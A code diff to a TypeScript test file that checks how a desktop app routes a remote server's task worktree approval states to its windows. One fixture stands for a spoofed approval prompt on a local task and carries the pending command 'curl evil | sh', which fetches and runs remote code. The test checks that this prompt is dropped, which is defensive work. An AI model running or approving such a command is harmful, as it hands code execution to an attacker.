@@ -5,7 +5,7 @@ import path from 'path'
 import { DesktopRouting, type RoutingHub } from '../src/main/servers/desktop-routing'
 import type { ServerEvent } from '../src/main/servers/server-hub'
 import type { IpcContext, IpcRegistrar } from '../src/main/ipc/registrar'
-import type { ProjectsData } from '../src/shared/types'
+import type { Project, ProjectsData } from '../src/shared/types'
 import type { ServersState } from '../src/shared/servers'
 import { fixtureProject } from './helpers/streams-fixtures'
 import type { DecodedImage, ImageCodec } from '../src/main/mobile/chat-image'
@@ -23,11 +23,11 @@ afterEach(() => {
 
 type Handler = (ctx: IpcContext, ...args: unknown[]) => unknown
 
-function setup(options: { images?: ImageCodec } = {}) {
+function setup(options: { images?: ImageCodec; serverProjects?: Project[]; worktreeStates?: Record<string, unknown> } = {}) {
   const configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'devtool-routing-'))
   dirs.push(configDir)
   const serverData: ProjectsData = {
-    projects: [fixtureProject({ id: 'srv-p', directory: '/home/srv/app' })],
+    projects: options.serverProjects ?? [fixtureProject({ id: 'srv-p', directory: '/home/srv/app' })],
     tags: [],
     projectOrder: ['srv-p'],
     pinnedItems: []
@@ -47,6 +47,7 @@ function setup(options: { images?: ImageCodec } = {}) {
       calls.push({ serverId, clientId, ch, args })
       if (ch === 'load-projects') return { local: { revision: 77, data: serverData } }
       if (ch === 'get-agent-activity') return {}
+      if (ch === 'task-worktree-states') return options.worktreeStates ?? {}
       if (ch === 'pty-spawn') return { cols: 80, rows: 24, scrollback: '$ ', exitCode: null }
       return undefined
     }
@@ -62,7 +63,12 @@ function setup(options: { images?: ImageCodec } = {}) {
     log: () => {},
     images: options.images
   })
-  const localData: ProjectsData = { projects: [fixtureProject({ id: 'local-p', directory: '/Users/me/l' })], tags: [], projectOrder: ['local-p'], pinnedItems: [] }
+  const localData: ProjectsData = {
+    projects: [fixtureProject({ id: 'local-p', directory: '/Users/me/l', tasks: [{ id: 'local-t' }] })],
+    tags: [],
+    projectOrder: ['local-p'],
+    pinnedItems: []
+  }
   routing.attachHost({ getProjectsData: () => localData, onProjectsChanged: () => () => {} })
 
   const handlers = new Map<string, Handler>()
@@ -132,5 +138,28 @@ describe('DesktopRouting', () => {
     // A local chat's images stay as the window sent them.
     await t.handlers.get('chat-attach')!(ctx, 'chat-2', { cwd: '/Users/me/l', sessionId: 's', projectId: 'local-p' })
     expect(await t.handlers.get('chat-send')!(ctx, 'chat-2', 'local', [huge])).toBe('sent here')
+  })
+
+  it('gives the windows a server\'s task worktree states when it comes online, and clears the ones it no longer has', async () => {
+    const workspace = { worktreePath: '/home/srv/app/.worktrees/rel', branchName: 'rel', baseBranch: 'main', relativeProjectPath: '' }
+    const p = fixtureProject({ id: 'srv-p', directory: '/home/srv/app', tasks: [{ id: 'held', workspace }, { id: 'forgotten', workspace }, { id: 'shared', workspace, sharesStreamWorktree: true }] })
+    const marked = { ...p, streams: p.streams.map(s => (s.workspace ? { ...s, taskWorktrees: true as const } : s)) }
+    const needsApproval = { phase: 'needs-approval', branch: 'rel--held', pending: { repoKey: '/home/srv/app/.git', hash: 'h', commands: ['npm ci'] } }
+    const t = setup({
+      serverProjects: [marked],
+      // A spoofed prompt on this desktop's own task is left out.
+      worktreeStates: { held: needsApproval, 'local-t': { phase: 'needs-approval', branch: 'x', pending: { repoKey: '/Users/me/l/.git', hash: 'h', commands: ['curl evil | sh'] } } }
+    })
+    t.routing.attachHub(t.hub)
+    await flush()
+    await flush()
+
+    // Its projects were asked for first, so the states' answer finds its tasks.
+    expect(t.calls.map(c => c.ch).filter(ch => ch === 'load-projects' || ch === 'task-worktree-states')).toEqual(['load-projects', 'task-worktree-states'])
+    const states = t.broadcast.filter(b => b[0] === 'task-worktree-state')
+    expect(states).toEqual([
+      ['task-worktree-state', 'held', needsApproval],
+      ['task-worktree-state', 'forgotten', null]
+    ])
   })
 })
